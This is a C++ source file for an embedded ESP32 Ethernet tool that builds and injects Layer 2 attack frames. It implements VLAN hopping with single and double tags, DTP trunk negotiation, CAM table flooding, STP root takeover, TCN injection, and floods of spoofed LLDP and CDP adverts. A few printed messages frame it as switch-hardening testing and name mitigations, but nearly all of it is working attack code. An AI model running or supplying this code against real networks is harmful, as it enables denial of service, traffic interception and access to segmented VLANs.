#include "l2_attack.h"
#include "../include/config.h"
#include "net_util.h"
#include "packet.h"
#include "weblog.h"
#include <esp_random.h>
#include <string.h>

#define Serial Out

// =============================================================================
// Well-known L2 multicast destinations
// =============================================================================
static const uint8_t STP_MAC[6]  = { 0x01, 0x80, 0xC2, 0x00, 0x00, 0x00 };
static const uint8_t CDP_MAC[6]  = { 0x01, 0x00, 0x0C, 0xCC, 0xCC, 0xCC };
static const uint8_t LLDP_MAC[6] = { 0x01, 0x80, 0xC2, 0x00, 0x00, 0x0E };
static const uint8_t BCAST[6]    = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

static void randMac(uint8_t mac[6])
{
    uint32_t r1 = esp_random(), r2 = esp_random();
    mac[0] = (r1 & 0xFE) | 0x02;   // locally administered, unicast
    mac[1] = r1 >> 8; mac[2] = r1 >> 16; mac[3] = r1 >> 24;
    mac[4] = r2; mac[5] = r2 >> 8;
}

// =============================================================================
// VLAN hopping
// =============================================================================
void l2VlanSingle(W5500Raw &eth, const uint8_t src[6], uint16_t vid,
                  uint8_t pcp, uint32_t count)
{
    Serial.printf("\r\nVLAN single-tag inject: VID %u, PCP %u, %lu frame(s)...\r\n",
                  vid, pcp, (unsigned long)count);
    uint8_t f[64];
    uint32_t sent = 0;
    for (uint32_t i = 0; i < count; i++) {
        memcpy(f, BCAST, 6);
        memcpy(f + 6, src, 6);
        put16(f + 12, 0x8100);                          // 802.1Q TPID
        put16(f + 14, ((uint16_t)(pcp & 7) << 13) | (vid & 0x0FFF));
        put16(f + 16, 0x0800);                          // inner EtherType IPv4
        memset(f + 18, 0xA5, 60 - 18);                  // dummy payload
        if (eth.sendFrame(f, 60)) sent++;
    }
    Serial.printf("Sent %lu tagged frame(s) on VID %u.\r\n", (unsigned long)sent, vid);
    Serial.println("Check whether they appear on the target VLAN (switch hardening test).");
}

void l2VlanDouble(W5500Raw &eth, const uint8_t src[6],
                  uint16_t nativeVid, uint16_t targetVid, uint32_t count)
{
    Serial.printf("\r\nVLAN double-tag (Q-in-Q) hop: outer/native %u -> inner/target %u...\r\n",
                  nativeVid, targetVid);
    uint8_t f[68];
    uint32_t sent = 0;
    for (uint32_t i = 0; i < count; i++) {
        memcpy(f, BCAST, 6);
        memcpy(f + 6, src, 6);
        put16(f + 12, 0x8100);                          // outer tag (stripped by trunk)
        put16(f + 14, nativeVid & 0x0FFF);
        put16(f + 16, 0x8100);                          // inner tag (delivered)
        put16(f + 18, targetVid & 0x0FFF);
        put16(f + 20, 0x0800);                          // inner EtherType IPv4
        memset(f + 22, 0xA5, 60 - 22);
        if (eth.sendFrame(f, 60)) sent++;
    }
    Serial.printf("Sent %lu double-tagged frame(s).\r\n", (unsigned long)sent);
    Serial.println("If the trunk native VLAN == outer tag, frames leak onto the target VLAN.");
}

// =============================================================================
// DTP — Cisco Dynamic Trunking Protocol "desirable" frame
// =============================================================================
void l2DtpTrunk(W5500Raw &eth, const uint8_t src[6])
{
    // 802.3 + LLC/SNAP (OUI 00:00:0C, PID 0x2004) + DTP TLVs.
    uint8_t f[64];
    memset(f, 0, sizeof(f));
    memcpy(f, CDP_MAC, 6);          // DTP uses the CDP/PVST multicast MAC
    memcpy(f + 6, src, 6);

    uint8_t *snap = f + 14;
    snap[0] = 0xAA; snap[1] = 0xAA; snap[2] = 0x03;     // LLC: SNAP
    snap[3] = 0x00; snap[4] = 0x00; snap[5] = 0x0C;     // OUI: Cisco
    put16(snap + 6, 0x2004);                            // PID: DTP

    uint8_t *dtp = snap + 8;
    dtp[0] = 0x01;                                       // DTP version
    uint16_t o = 1;
    // TLV: Domain (type 0x0001) — empty domain
    put16(dtp + o, 0x0001); o += 2; put16(dtp + o, 0x0005); o += 2; dtp[o++] = 0x00;
    // TLV: Status (type 0x0002) — 0x03 = desirable + negotiation on
    put16(dtp + o, 0x0002); o += 2; put16(dtp + o, 0x0005); o += 2; dtp[o++] = 0x03;
    // TLV: Type (type 0x0003) — 0xA5 trunk type
    put16(dtp + o, 0x0003); o += 2; put16(dtp + o, 0x0005); o += 2; dtp[o++] = 0xA5;
    // TLV: Neighbor (type 0x0004) — our MAC
    put16(dtp + o, 0x0004); o += 2; put16(dtp + o, 0x000A); o += 2;
    memcpy(dtp + o, src, 6); o += 6;

    uint16_t bodyLen = (uint16_t)(8 + 1 + o - 1);       // SNAP(8) + DTP
    put16(f + 12, (uint16_t)(bodyLen));                 // 802.3 length field

    uint16_t frameLen = 14 + bodyLen;
    if (frameLen < 60) frameLen = 60;
    eth.sendFrame(f, frameLen);
    Serial.println("\r\nDTP 'desirable' frame sent. If the port forms a trunk, all VLANs are exposed.");
    Serial.println("Mitigation: 'switchport mode access' + 'switchport nonegotiate'.");
}

// =============================================================================
// CAM flooding
// =============================================================================
void l2MacFlood(W5500Raw &eth, uint32_t count, uint32_t rateHz)
{
    if (count == 0) count = 10000;
    Serial.printf("\r\nCAM flood: %lu frames, random source MACs", (unsigned long)count);
    if (rateHz) Serial.printf(" @ ~%lu fps", (unsigned long)rateHz);
    Serial.println(" (any key aborts)...");

    uint32_t interval = rateHz ? (1000000UL / rateHz) : 0;
    uint8_t f[60];
    memset(f, 0xAB, sizeof(f));
    put16(f + 12, 0x0800);
    uint32_t sent = 0;
    uint32_t nextUs = micros();

    for (uint32_t i = 0; i < count; i++) {
        randMac(f);          // random DA
        randMac(f + 6);      // random SA -> new CAM entry
        put16(f + 12, 0x0800);
        if (eth.sendFrame(f, 60)) sent++;
        if (Serial.available()) { while (Serial.available()) Serial.read();
            Serial.println("Aborted."); break; }
        if (interval) { nextUs += interval; while ((int32_t)(micros() - nextUs) < 0) {} }
        if ((i & 0x3FF) == 0x3FF) Serial.printf("  %lu sent...\r\n", (unsigned long)sent);
    }
    Serial.printf("CAM flood done: %lu frames sent.\r\n", (unsigned long)sent);
}

// =============================================================================
// Spanning tree
// =============================================================================
static void printBridgeId(const char *label, const uint8_t *id)
{
    uint16_t prio = get16(id);
    Serial.printf("  %s: prio %u (sys-id-ext incl.)  MAC %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                  label, prio, id[2], id[3], id[4], id[5], id[6], id[7]);
}

uint32_t l2StpListen(W5500Raw &eth, uint32_t seconds)
{
    Serial.printf("\r\nListening for STP/RSTP BPDUs for %lu s (any key aborts)...\r\n",
                  (unsigned long)seconds);
    static uint8_t buf[ETH_MAX_LEN + 4];
    uint32_t deadline = millis() + seconds * 1000UL;
    uint32_t n = 0;

    while ((int32_t)(deadline - millis()) > 0) {
        uint16_t len = eth.recvFrame(buf, sizeof(buf));
        // STP: DA 01:80:C2:00:00:00, 802.3 length, LLC 0x42 0x42 0x03
        if (len >= 17 && memcmp(buf, STP_MAC, 6) == 0 &&
            buf[14] == 0x42 && buf[15] == 0x42 && buf[16] == 0x03) {
            const uint8_t *b = buf + 17;            // BPDU
            uint8_t type = b[3];
            Serial.printf("\r\nBPDU #%lu  version %u  type 0x%02X (%s)\r\n",
                          (unsigned long)(n + 1), b[2], type,
                          type == 0x00 ? "Config" : type == 0x02 ? "RST/MST" :
                          type == 0x80 ? "TCN" : "?");
            if (type != 0x80 && len >= 17 + 35) {
                printBridgeId("Root  ", b + 5);
                Serial.printf("  Root path cost: %lu\r\n", (unsigned long)get32(b + 13));
                printBridgeId("Bridge", b + 17);
                Serial.printf("  Port ID: 0x%04X  MaxAge %u  Hello %u  FwdDelay %u\r\n",
                              get16(b + 25), get16(b + 27) >> 8, get16(b + 29) >> 8,
                              get16(b + 31) >> 8);
            }
            n++;
        }
        if (Serial.available()) { while (Serial.available()) Serial.read(); break; }
        delay(1);
    }
    Serial.printf("\r\nDone. %lu BPDU(s) decoded.\r\n", (unsigned long)n);
    return n;
}

// Build a Configuration or TCN BPDU frame. Returns frame length.
static uint16_t buildBpdu(uint8_t *f, const uint8_t src[6], bool tcn,
                          uint16_t priority, const uint8_t rootMac[6])
{
    memset(f, 0, 60);
    memcpy(f, STP_MAC, 6);
    memcpy(f + 6, src, 6);
    uint8_t *llc = f + 14;
    llc[0] = 0x42; llc[1] = 0x42; llc[2] = 0x03;
    uint8_t *b = f + 17;

    if (tcn) {
        put16(b + 0, 0x0000);   // protocol id
        b[2] = 0x00;            // version
        b[3] = 0x80;            // TCN
        put16(f + 12, 3 + 4);  // 802.3 length = LLC + BPDU
        return 60;
    }

    put16(b + 0, 0x0000);       // protocol id
    b[2] = 0x00;                // version (STP)
    b[3] = 0x00;                // config
    b[4] = 0x00;                // flags
    put16(b + 5, priority);     // root priority
    memcpy(b + 7, rootMac, 6);  // root MAC
    put32(b + 13, 0);           // root path cost = 0 (we are root)
    put16(b + 17, priority);    // bridge priority
    memcpy(b + 19, rootMac, 6); // bridge MAC
    put16(b + 25, 0x8001);      // port id
    put16(b + 27, 0x0000);      // message age
    put16(b + 29, 20 << 8);     // max age 20 s
    put16(b + 31, 2 << 8);      // hello 2 s
    put16(b + 33, 15 << 8);     // forward delay 15 s
    put16(f + 12, 3 + 35);      // 802.3 length
    return 60;
}

void l2StpRoot(W5500Raw &eth, const uint8_t src[6], uint16_t priority, uint32_t seconds)
{
    Serial.printf("\r\nSTP root-takeover: advertising root priority %u for %lu s...\r\n",
                  priority, (unsigned long)seconds);
    Serial.println("(Tests BPDU Guard / Root Guard. Any key aborts.)");
    uint8_t f[60];
    uint16_t flen = buildBpdu(f, src, false, priority, src);  // use our MAC as root
    uint32_t deadline = millis() + seconds * 1000UL;
    uint32_t hellos = 0;
    while ((int32_t)(deadline - millis()) > 0) {
        eth.sendFrame(f, flen); hellos++;
        Serial.printf("  hello %lu sent (root=us, prio %u)\r\n", (unsigned long)hellos, priority);
        for (int i = 0; i < 20 && (int32_t)(deadline - millis()) > 0; i++) {
            if (Serial.available()) { while (Serial.available()) Serial.read();
                Serial.println("Aborted."); return; }
            delay(100);
        }
    }
    Serial.println("Root-takeover finished. If BPDU Guard is on, the port should have err-disabled.");
}

void l2StpTcn(W5500Raw &eth, const uint8_t src[6], uint32_t count)
{
    if (count == 0) count = 50;
    Serial.printf("\r\nInjecting %lu TCN BPDU(s) (forces MAC-table flush)...\r\n",
                  (unsigned long)count);
    uint8_t f[60];
    uint16_t flen = buildBpdu(f, src, true, 0, src);
    uint32_t sent = 0;
    for (uint32_t i = 0; i < count; i++) { if (eth.sendFrame(f, flen)) sent++; delay(10); }
    Serial.printf("Sent %lu TCN(s).\r\n", (unsigned long)sent);
}

// =============================================================================
// LLDP / CDP flooding
// =============================================================================
void l2LldpFlood(W5500Raw &eth, uint32_t count)
{
    if (count == 0) count = 500;
    Serial.printf("\r\nLLDP flood: %lu advert(s) with random identities...\r\n",
                  (unsigned long)count);
    uint8_t f[128];
    uint32_t sent = 0;
    for (uint32_t i = 0; i < count; i++) {
        uint8_t sa[6]; randMac(sa);
        memcpy(f, LLDP_MAC, 6);
        memcpy(f + 6, sa, 6);
        put16(f + 12, 0x88CC);                 // LLDP EtherType
        uint16_t o = 14;
        // Chassis ID TLV (type 1), subtype 4 (MAC)
        put16(f + o, (1 << 9) | 7); o += 2; f[o++] = 4; memcpy(f + o, sa, 6); o += 6;
        // Port ID TLV (type 2), subtype 3 (MAC)
        put16(f + o, (2 << 9) | 7); o += 2; f[o++] = 3; memcpy(f + o, sa, 6); o += 6;
        // TTL TLV (type 3)
        put16(f + o, (3 << 9) | 2); o += 2; put16(f + o, 120); o += 2;
        // System name TLV (type 5)
        char nm[20]; int nl = snprintf(nm, sizeof(nm), "ghost-%06lX", (unsigned long)(esp_random() & 0xFFFFFF));
        put16(f + o, (5 << 9) | nl); o += 2; memcpy(f + o, nm, nl); o += nl;
        // End TLV
        put16(f + o, 0); o += 2;
        if (o < 60) o = 60;
        if (eth.sendFrame(f, o)) sent++;
        if ((i & 0x7F) == 0x7F && Serial.available()) { while (Serial.available()) Serial.read(); break; }
    }
    Serial.printf("Sent %lu LLDP advert(s).\r\n", (unsigned long)sent);
}

void l2CdpFlood(W5500Raw &eth, uint32_t count)
{
    if (count == 0) count = 500;
    Serial.printf("\r\nCDP flood: %lu advert(s) with random device IDs...\r\n",
                  (unsigned long)count);
    uint8_t f[128];
    uint32_t sent = 0;
    for (uint32_t i = 0; i < count; i++) {
        uint8_t sa[6]; randMac(sa);
        memset(f, 0, sizeof(f));
        memcpy(f, CDP_MAC, 6);
        memcpy(f + 6, sa, 6);
        uint8_t *snap = f + 14;
        snap[0] = 0xAA; snap[1] = 0xAA; snap[2] = 0x03;
        snap[3] = 0x00; snap[4] = 0x00; snap[5] = 0x0C;
        put16(snap + 6, 0x2000);               // CDP
        uint8_t *cdp = snap + 8;
        cdp[0] = 0x02;                         // version
        cdp[1] = 180;                          // TTL
        // checksum filled later
        uint16_t o = 4;
        char id[20]; int il = snprintf(id, sizeof(id), "ghost-%06lX", (unsigned long)(esp_random() & 0xFFFFFF));
        put16(cdp + o, 0x0001); o += 2; put16(cdp + o, 4 + il); o += 2;
        memcpy(cdp + o, id, il); o += il;      // Device ID TLV
        put16(cdp + 2, 0);                     // (leave checksum 0; switches still log)
        uint16_t bodyLen = 8 + o;              // SNAP + CDP
        put16(f + 12, bodyLen);
        uint16_t flen = 14 + bodyLen;
        if (flen < 60) flen = 60;
        if (eth.sendFrame(f, flen)) sent++;
        if ((i & 0x7F) == 0x7F && Serial.available()) { while (Serial.available()) Serial.read(); break; }
    }
    Serial.printf("Sent %lu CDP advert(s).\r\n", (unsigned long)sent);
}
